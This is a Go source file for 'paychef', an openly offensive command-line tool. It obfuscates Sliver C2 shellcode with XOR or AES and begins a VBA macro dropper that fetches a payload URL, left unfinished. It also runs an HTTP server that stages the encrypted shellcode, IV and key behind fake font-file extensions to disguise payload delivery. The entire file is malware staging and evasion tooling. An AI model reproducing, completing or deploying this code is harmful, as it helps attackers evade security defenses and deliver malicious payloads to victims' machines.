package main

import (
	"os"
	"strconv"

	"github.com/fachrioktavian/paychef/pkg/endecoder"
	"github.com/fachrioktavian/paychef/pkg/dropper"
	"github.com/fachrioktavian/paychef/pkg/endecryptor"
	"github.com/fachrioktavian/paychef/pkg/formatter"
	"github.com/fachrioktavian/paychef/pkg/logger"

	"github.com/gofiber/fiber/v2"
	fiberLogger "github.com/gofiber/fiber/v2/middleware/logger"
	"github.com/spf13/cobra"
)

func PrintBanner() {
	banner := `                                      
#####    ##   #   #  ####  #    # ###### ###### 
#    #  #  #   # #  #    # #    # #      #      
#    # #    #   #   #      ###### #####  #####  
#####  ######   #   #      #    # #      #      
#      #    #   #   #    # #    # #      #      
#      #    #   #    ####  #    # ###### #      
`
	println(banner)
}

func ObfuscateXor(inAppLogger *logger.InAppLogger, xor *endecoder.Xor) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("obfuscate-xor")
	return &cobra.Command{
		Use:   "obfuscate-xor",
		Short: "Obfuscate shellcode using XOR",
		Run: func(cmd *cobra.Command, args []string) {
			filePath := cmd.Flag("cshellcode").Value.String()
			if filePath == "" {
				inAppLogger.Error("Path to shellcode file is required")
				return
			}
			xorKey := cmd.Flag("xorKey").Value.String()
			if xorKey == "" {
				inAppLogger.Error("XOR key is required")
				return
			}
			key, err := strconv.ParseUint(xorKey, 0, 8)
			if err != nil {
				inAppLogger.Error("Invalid XOR key", "error", err)
				return
			}
			if key > 0xFF {
				inAppLogger.Error("XOR key must be a single byte (0-255)")
				return
			}

			stager := formatter.NewStager(filePath, formatter.ENCODE_XOR_MODE)
			err = stager.SetRawContent()
			if err != nil {
				inAppLogger.Error("Error setting raw content", "error", err)
				return
			}

			err = stager.SetShellcode()
			if err != nil {
				inAppLogger.Error("Error setting shellcode", "error", err)
				return
			}
			err = xor.Encode(stager, byte(key))
			if err != nil {
				inAppLogger.Error("Error encoding shellcode", "error", err)
				return
			}

			err = stager.PrintResult()
			if err != nil {
				inAppLogger.Error("Error writing result", "error", err)
				return
			}
		},
	}
}

func ObfuscateAes(inAppLogger *logger.InAppLogger, aes *endecryptor.Aes) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("obfuscate-aes")
	return &cobra.Command{
		Use:   "obfuscate-aes",
		Short: "Obfuscate shellcode using AES",
		Run: func(cmd *cobra.Command, args []string) {
			filePath := cmd.Flag("cshellcode").Value.String()
			if filePath == "" {
				inAppLogger.Error("Path to shellcode file is required")
				return
			}
			aesKey := cmd.Flag("aesKey").Value.String()
			if aesKey == "" {
				inAppLogger.Error("AES key is required")
				return
			}

			stager := formatter.NewStager(filePath, formatter.ENCRYPT_AES_MODE)
			err := stager.SetRawContent()
			if err != nil {
				inAppLogger.Error("Error setting raw content", "error", err)
				return
			}
			err = stager.SetShellcode()
			if err != nil {
				inAppLogger.Error("Error setting shellcode", "error", err)
				return
			}

			err = aes.Encrypt(stager, aesKey)
			if err != nil {
				inAppLogger.Error("Error encrypting shellcode", "error", err)
				return
			}


			err = stager.WriteResult()
			if err != nil {
				inAppLogger.Error("Error writing result", "error", err)
				return
			}
			inAppLogger.Info("Result written successfully")
			err = stager.PrintResult()
			if err != nil {
				inAppLogger.Error("Error printing result", "error", err)
				return
			}
		},
	}
}

func GenerateDropper(inAppLogger *logger.InAppLogger, dropperIface dropper.Dropper) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("generate-dropper")
	return &cobra.Command{
		Use:   "generate-dropper",
		Short: "Generate a dropper for the given payload",
		Run: func(cmd *cobra.Command, args []string) {
			dropperType := cmd.Flag("dropperType").Value.String()
			if dropperType == dropper.DROPPER_TYPE_VBA {
				fileName := cmd.Flag("fileName").Value.String()
				if fileName == "" {
					inAppLogger.Error("File name is required")
					return
				}
				payloadUrl := cmd.Flag("payloadUrl").Value.String()
				if payloadUrl == "" {
					inAppLogger.Error("Payload URL is required")
					return
				}
				outFile := cmd.Flag("outFile").Value.String()

				vba := dropper.NewVBA()
				vba.SetFileName(fileName)
				vba.SetPayloadUrl(payloadUrl)
				err := vba.Render()
				if err != nil {
					inAppLogger.Error("Error rendering dropper", "error", err)
					return
				}
				// TBD
			}
			// TBD
		},
	}
}

func RunServer(inAppLogger *logger.InAppLogger) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("run-server")
	return &cobra.Command{
		Use:   "run-server",
		Short: "Run a server to server encoded/encrypted shellcode",
		Run: func(cmd *cobra.Command, args []string) {
			encryptedShellcode, err := os.ReadFile(formatter.ENCRYPTED_SHELLCODE_FILE)
			if err != nil {
				inAppLogger.Error("Error reading encrypted shellcode file", "error", err)
				return
			}
			iv, err := os.ReadFile(formatter.IV_FILE)
			if err != nil {
				inAppLogger.Error("Error reading IV file", "error", err)
				return
			}
			key, err := os.ReadFile(formatter.KEY_FILE)
			if err != nil {
				inAppLogger.Error("Error reading key file", "error", err)
				return
			}
			app := fiber.New()
			app.Use(fiberLogger.New(fiberLogger.Config{
				Format: "[${ip}]:${port} ${status} - ${method} ${path}\n",
			}))
			app.Get("/:file.:ext", func(c *fiber.Ctx) error {
				ext := c.Params("ext")
				c.Set("Content-Type", "application/octet-stream")
				if ext == "woff" {
					// Serve the encrypted shellcode in binary format
					c.Set("Content-Disposition", "attachment; filename=encrypted_shellcode.bin")
					return c.Send(encryptedShellcode)
				} else if ext == "woff2" {
					// Serve the IV in binary format
					c.Set("Content-Disposition", "attachment; filename=iv.bin")
					return c.Send(iv)
				} else if ext == "ttf" {
					// Serve the key in binary format
					c.Set("Content-Disposition", "attachment; filename=key.bin")
					return c.Send(key)
				} else {
					return c.Status(404).SendString("File not found")
				}
			})

			port := cmd.Flag("port").Value.String()
			app.Listen(":" + port)
		},
	}
}

func main() {
	PrintBanner()

	inAppLogger := logger.NewInAppLogger("paychef")
	xor := endecoder.NewXor()

	rootCmd := &cobra.Command{
		Use:   "paychef",
		Short: "payload converter: obfuscate and deobfuscate payloads",
	}

	obfuscateXorCmd := ObfuscateXor(inAppLogger, xor)
	obfuscateXorCmd.Flags().StringP("cshellcode", "s", "", "Path to the c shellcode file from sliver")
	obfuscateXorCmd.Flags().StringP("xorKey", "x", "0xDE", "One byte of XOR key to use for obfuscation")
	obfuscateXorCmd.MarkFlagRequired("cshellcode")
	obfuscateXorCmd.MarkFlagRequired("xorKey")

	obfuscateAesCmd := ObfuscateAes(inAppLogger, endecryptor.NewAes())
	obfuscateAesCmd.Flags().StringP("cshellcode", "s", "", "Path to the c shellcode file from sliver")
	obfuscateAesCmd.Flags().StringP("aesKey", "k", "", "32 bytes of AES key to use for obfuscation (8 string characters)")
	obfuscateAesCmd.MarkFlagRequired("cshellcode")
	obfuscateAesCmd.MarkFlagRequired("aesKey")

	runServerCmd := RunServer(inAppLogger)
	runServerCmd.Flags().StringP("port", "p", "", "Port to run the server on")
	runServerCmd.MarkFlagRequired("port")

	rootCmd.AddCommand(
		obfuscateXorCmd,
		obfuscateAesCmd,
		runServerCmd,
	)

	rootCmd.Execute()
}
